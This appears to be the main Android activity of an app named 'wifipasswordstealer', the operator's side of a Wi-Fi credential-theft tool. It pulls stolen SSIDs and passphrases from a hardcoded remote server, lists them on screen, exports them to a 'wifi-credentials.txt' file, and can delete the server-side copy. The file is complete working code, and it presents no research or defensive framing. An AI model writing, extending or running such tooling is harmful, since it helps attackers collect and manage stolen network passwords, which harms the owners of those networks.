package com.perrakis.wifipasswordstealer;

import android.graphics.Color;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.util.Pair;
import android.util.TypedValue;
import android.view.Gravity;
import android.widget.Button;
import android.widget.TableLayout;
import android.widget.TableRow;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity
{
    private String fileContent = "";

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Start the background task
        retrieveDataFromServer();

        Button deleteBtn = findViewById(R.id.deleteBtn);
        deleteBtn.setOnClickListener(v ->
        {
            Executors.newSingleThreadExecutor().execute(() ->
                performHTTPDeleteRequest("http://35.211.202.21:8000"));
        });

        Button refreshBtn = findViewById(R.id.refreshBtn);
        refreshBtn.setOnClickListener(v ->
        {
            retrieveDataFromServer();
        });

        Button exportBtn = findViewById(R.id.exportBtn);
        exportBtn.setOnClickListener(v ->
        {
            // Get the Downloads directory
            File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);

            // Create the file in the Downloads directory
            File file = new File(downloadsDir, "wifi-credentials.txt");

            try (FileWriter writer = new FileWriter(file))
            {
                writer.write(fileContent);
                Toast.makeText(this, "File was exported successfully.", Toast.LENGTH_SHORT).show();
            }
            catch (IOException e)
            {
                System.err.println("Error writing to file: " + e.getMessage());
                Toast.makeText(this, "File was not exported.", Toast.LENGTH_SHORT).show();
            }
        });


//        // On Swipe
//        SwipeRefreshLayout swipeRefreshLayout = findViewById(R.id.swipeRefreshLayout);
//        swipeRefreshLayout.setOnRefreshListener(() ->
//        {
//            // Clear existing content of the TableLayout
//            TableLayout tableLayout = findViewById(R.id.tableLayout);
//            tableLayout.removeAllViews();
//
//            // Repopulate the TableLayout with new data
//            // Call a method to fetch and populate data into the TableLayout
//            retrieveDataFromServer();
//
//            // Stop the refreshing animation
//            swipeRefreshLayout.setRefreshing(false);
//        });
    }

    private void retrieveDataFromServer()
    {
        Executors.newSingleThreadExecutor().execute(() ->
        {
            // Background task code
            Pair<List<String>, List<String>> result =
                    performHttpGetRequest("http://35.211.202.21:8000");

            if (result != null)
            {
                List<String> ssids = result.first;
                List<String> passphrases = result.second;

                runOnUiThread(()-> ((TableLayout)findViewById(R.id.tableLayout)).removeAllViews());

                for (int i = 2; i < ssids.size(); i++)
                {
                    createRowDynamically(ssids.get(i), passphrases.get(i), i % 2 == 0);
                    fileContent += ssids.get(i) + " " + passphrases.get(i) + "\n";
                }

                runOnUiThread(()-> Toast.makeText(this, "Credentials were retrieved successfully.", Toast.LENGTH_SHORT).show());
            }
            else
            {
                // Handle null or error response
                Log.e("HTTP GET Response", "Error: Response is null or empty");
            }
        });
    }

    private void createRowDynamically(String ssid, String password, boolean alternateColor)
    {
        // Create a new TableRow
        TableRow tableRow = new TableRow(getApplicationContext());

        // Set TableRow attributes
        tableRow.setLayoutParams(new TableRow.LayoutParams(TableRow.LayoutParams.MATCH_PARENT,300)); // Set height to 300dp
        tableRow.setBackgroundColor(Color.parseColor(alternateColor? "#E5E7FA" : "#ECEEFD"));
        tableRow.setPadding(10, 10, 10, 10);

        // Create TextView for the first column
        TextView textView1 = new TextView(getApplicationContext());
        textView1.setLayoutParams(new TableRow.LayoutParams(0, 150,3));
        textView1.setGravity(Gravity.CENTER);
        textView1.setText(ssid);
        textView1.setTextColor(Color.BLACK);
        textView1.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);

        // Create TextView for the second column
        TextView textView2 = new TextView(getApplicationContext());
        textView2.setLayoutParams(new TableRow.LayoutParams(0,150,3));
        textView2.setGravity(Gravity.CENTER);
        textView2.setText(password);
        textView2.setTextColor(Color.BLACK);
        textView2.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);

        // Add TextViews to TableRow
        tableRow.addView(textView1);
        tableRow.addView(textView2);

        // Add the TableRow to the TableLayout
        TableLayout tableLayout = findViewById(R.id.tableLayout);

        runOnUiThread(() -> tableLayout.addView(tableRow));
    }

    private void performHTTPDeleteRequest(String urlString)
    {
        try
        {
            // Create a URL object
            URL url = new URL(urlString);

            // Create a HttpURLConnection object
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            // Set request method to DELETE
            conn.setRequestMethod("DELETE");

            // Connect to the server
            conn.connect();

            // Get the response code
            int responseCode = conn.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK)
            {
                runOnUiThread(()->
                {
                    Toast.makeText(this, "File was deleted from server successfully.", Toast.LENGTH_SHORT).show();
                    ((TableLayout)findViewById(R.id.tableLayout)).removeAllViews();
                });
            }
            else
            {
                runOnUiThread(()-> Toast.makeText(this, "File could not be deleted.", Toast.LENGTH_SHORT).show());
            }
        }
        catch (IOException e)
        {
            // Log exception
            Log.e("HTTP DELETE Request", "Error: " + e.getMessage(), e);
        }
    }

    private Pair<List<String>, List<String>> performHttpGetRequest(String urlString)
    {
        try
        {
            // Create a URL object
            URL url = new URL(urlString);

            // Create a HttpURLConnection object
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            // Set request method to GET
            conn.setRequestMethod("GET");

            // Connect to the server
            conn.connect();

            // Get the response code
            int responseCode = conn.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK)
            {
                // Read the input stream
                InputStream inputStream = conn.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));

                List<String> ssids = new ArrayList<>();
                List<String> passwords = new ArrayList<>();

                String line;
                while ((line = reader.readLine()) != null)
                {
                    // Split the line into columns
                    String[] columns = line.split("\\s+");
                    if (columns.length >= 2) {
                        // Extract SSID and Password from the first two columns
                        ssids.add(columns[0]);
                        passwords.add(columns[1]);
                    }
                }

                // Close the streams
                reader.close();
                inputStream.close();

                // Return the response data
                return new Pair<>(ssids, passwords);
            }
        }
        catch (IOException e)
        {
            // Log exception
            Log.e("HTTP GET Request", "Error: " + e.getMessage(), e);
        }

        // Return null if there was an error
        return null;
    }

}
